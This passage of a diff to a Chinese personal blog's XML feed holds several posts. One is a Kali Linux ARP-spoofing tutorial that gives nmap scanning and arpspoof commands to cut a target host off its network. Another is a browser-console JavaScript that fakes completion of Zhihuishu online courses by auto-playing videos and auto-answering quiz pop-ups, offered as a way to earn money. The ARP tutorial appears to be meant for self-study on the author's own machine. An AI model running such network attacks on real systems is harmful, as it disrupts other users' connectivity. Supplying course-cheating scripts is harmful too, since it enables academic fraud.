title="ARP攻击的攻击原理"></a>ARP攻击的攻击原理</h3><p>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><h2 id="在Kali-Linux环境下的实现ARP攻击"><a href="#在Kali-Linux环境下的实现ARP攻击" class="headerlink" title="在Kali Linux环境下的实现ARP攻击"></a>在Kali Linux环境下的实现ARP攻击</h2><p>攻击环境<br>攻击主机：Kali Linux </p><p>IP：192.168.1.13</p><p>被攻击主机：Windows 10</p><p>IP：192.168.1.10</p><p>因为是在虚拟机环境下实现的攻击，所以要提前将虚拟机的网络适配器设置为桥接模式，这样一来虚拟机便可以单独获得一个ip地址，而不是和NAT模式下一样和宿主机共用一个ip地址。</p><h3 id="ARP断网攻击（更多攻击手段持续更新ing）"><a href="#ARP断网攻击（更多攻击手段持续更新ing）" class="headerlink" title="ARP断网攻击（更多攻击手段持续更新ing）"></a>ARP断网攻击（更多攻击手段持续更新ing）</h3><p>在进行攻击的时候我们需要先知道自己的IP地址，在终端中输入ifconfig指令即可（所说的终端是kali系统中的cmd在左侧任务栏内，一般是第二个）</p><p><img src="http://psu9uo26a.bkt.clouddn.com/2019-06-13_181357.png" alt="@子龙"></p><p>在知道了自己IP地址的情况下，我们同时也知道了自己所在的网段，接下来我们可以找一下当前局域网下还存在哪些主机，<br>如果想看自己电脑连接的那台路由器上的网管输入ipconfig查看<br><img src="http://psu9uo26a.bkt.clouddn.com/2019-06-13_183724.png" alt="@子龙"><br>这里使用nmap脚本（nmap可以扫描出当前路由器下被占用的端口，通俗点讲就是这些端口都是有人在使用的！）出于道德我演示攻击自己的电脑为例子！<br>命令：namp -sP 192.168.1.*<br>后面的是网关ip，不是绝对的，网关地址在上图中可以看到<br><img src="http://psu9uo26a.bkt.clouddn.com/2019-06-13_183837.png" alt="@子龙"><br><img src="http://psu9uo26a.bkt.clouddn.com/2019-06-13_183911.png" alt="@子龙"><br>可以看到我们已经通过namp命令扫描出了当前路由器下的ip<br>对比上下图，我们可以发现我们的目标ip的确也是在列表中的，这个时候目标还是可以正常上网的</p><p>此时，在Kali中使用arpspoof工具实现ARP攻击<br>攻击命令：Arpspoof -i eth0 -t 192.168.1.10 -t 192.168.1.1<br>ip就是目标ip加上网关地址<br><img src="http://psu9uo26a.bkt.clouddn.com/2019-06-13_185319.png" alt="@子龙"><br><img src="http://psu9uo26a.bkt.clouddn.com/2019-06-13_185346.png" alt="@子龙"></p><p>这个时候的目标已经无法正常上网了</p><p><img src="http://psu9uo26a.bkt.clouddn.com/2019-06-13_185512.png" alt="@子龙"></p><p>停止ARP攻击，目标就能恢复到正常上网状态<br>快捷键是（Ctrl+c）结束攻击！</p>]]></content>
       
@@ -86,8 +194,8 @@
     
     <entry>
       <title>踏上渗透之路</title>
-      <link href="/2019/06/11/frist/"/>
-      <url>/2019/06/11/frist/</url>
+      <link href="/2019/06/11/attark/frist/"/>
+      <url>/2019/06/11/attark/frist/</url>
       
         <content type="html"><![CDATA[<p>在我们翻开一本关于开发类的书籍的时候都会看到一句：“工欲善其事必先利其器”，这句话给我们的意思呢大概就是，要想学好编程，首先得有开发工具，接下来，我就来讲怎么安装Linux kali 系统的环境，这时候很多人会产生疑惑，不久是个系统吗直接装不就好了？为啥还要环境，由于kali系统是全root模式安全性为0，容易被病毒入侵，不利于测试，几乎很少有人把它直接装在自己的电脑硬盘上，所以这时候我们有需要一个虚拟机，（简单说一下虚拟机的概念：虚拟机它就是可以模拟各种系统运行的一个软件，通常都指-VMware）<br><a href="https://blog.csdn.net/baijinswpu/article/details/80835417" target="_blank" rel="noopener">虚拟机安装教程</a></p><p>这时候呢你电脑上已经有虚拟机软件了，接下来就需要linux kali的镜像文件进行安装到虚拟机上就ok了<br>注意网络模式要设为桥接！还有就是密匙网上都有！随便搜一下就永久免费啦！下面附上kali系统的安装教程。<br><a href="https://blog.csdn.net/qq_40950957/article/details/80468030" target="_blank" rel="noopener">kali系统安装教程</a></p><p>到这我相信你已经安装好了kali系统的环境！！！，如果有问题可以点博客下的企鹅咨询我！</p>]]></content>
       
@@ -113,8 +221,8 @@
     
     <entry>
       <title>关于本站</title>
-      <link href="/2019/06/09/aboutweb/"/>
-      <url>/2019/06/09/aboutweb/</url>
+      <link href="/2019/06/09/web/aboutweb/"/>
+      <url>/2019/06/09/web/aboutweb/</url>
       
         <content type="html"><![CDATA[<p>我是个非常懒的人，非常不自律，嗯，可能在老师眼里我就是那个学习吊儿郎当，不踏实的学生，虽然老师们没有直说，但我还是能看清自己，俗话说的好知错能改就是好孩子，<br>所以呢！我决定时常反省一下自己，没事就写写博客吧！起初没想好写些什么，圈子里都讲不想当黑客的程序员不是好程序员，于是我想写写关于linux kali渗透测试的东西，<br>其实黑客的概念非常广泛，就像白帽子于黑帽子那样，嗯，可以想一下白天白帽子晚上黑帽子（当然这是开玩笑的！）学习这方面东西是要有一定原则的，不能去干那啥事情！在这儿我将会分享一些技术，希望能激起你对计算机的兴趣！</p>]]></content>
       
@@ -140,8 +248,8 @@
     
     <entry>
       <title>智慧树刷课秘籍</title>
-      <link href="/2019/05/18/t/"/>
-      <url>/2019/05/18/t/</url>
+      <link href="/2019/05/18/class/"/>
+      <url>/2019/05/18/class/</url>
       
         <content type="html"><![CDATA[<p>网课可以自己刷，很多人花钱去弄，我觉得没必要，简述一下最安全的刷课方法，你看了之后，或许可以利用它赚钱，话不多说，</p><p>登陆！<br>登上之后选择你要看的一门课，然后播放，一般浏览器按f12就会调出开发者模式，建议用谷歌，这个下学期写网页也会用到，将下面一段js代码复制粘贴到开发者模式下的console窗口内<br>代码从下面var开始复制，js当中只有var类型变量..话不多说<br>var ti = $(“body”);<br>var video = $(“.catalogue_ul1 li[id*=video-]”);<br>var i = 1;<br>var v = 1;<br>video.css(“color”, “blue”);<br>console.log(“已选取” + video.length + “个小节,并已用蓝色标明,请检查是否有遗漏,如有遗漏,概不负责”);<br>setTimeout(function () {<br>    $(‘.speedTab15’).click();<br>    $(‘.volumeIcon’).click();<br>    console.log(“已进行静音和1.5倍加速”);<br>}, 3000);<br>ti.on(“DOMNodeInserted”, function (e) {<br>    if (e.target.textContent == “关闭”) {<br>        console.log(“检测到第” + i + “个弹题窗口”);<br>        window.setTimeout(function () {<br>            document.getElementById(“tmDialog_iframe”).contentWindow.document.getElementsByClassName(“answerOption”)[0].getElementsByTagName(“input”)[0].click();<br>            $(“.popbtn_cancel”).click();<br>            console.log(“已关闭”);<br>        }, 3000);<br>        i++;<br>    } else if (e.target.textContent == “本节视频,累计观看时间『100%』”) {<br>        console.log(“检测到视频观看完成，准备跳到下一节”);<br>        $(‘.next_lesson_bg’).find(‘a’).trigger(‘click’);<br>        console.log(“已跳转”);<br>        setTimeout(function () {<br>            $(‘.volumeIcon’).click();<br>            $(‘.speedTab15’).click();<br>            console.log(“已进行静音和1.5倍加速”);<br>        }, 6000);<br>        v++;<br>        console.log(“目前播放了” + v + “个视频”);<br>    }<br>});<br>按回车运行js代码,（代码于2019.3.24号优化更新）之后电脑就会自己刷课<br>虽然代码有静音操作，但是还是建议把声音关了，因为时不时会bug一下出声</p>]]></content>
       
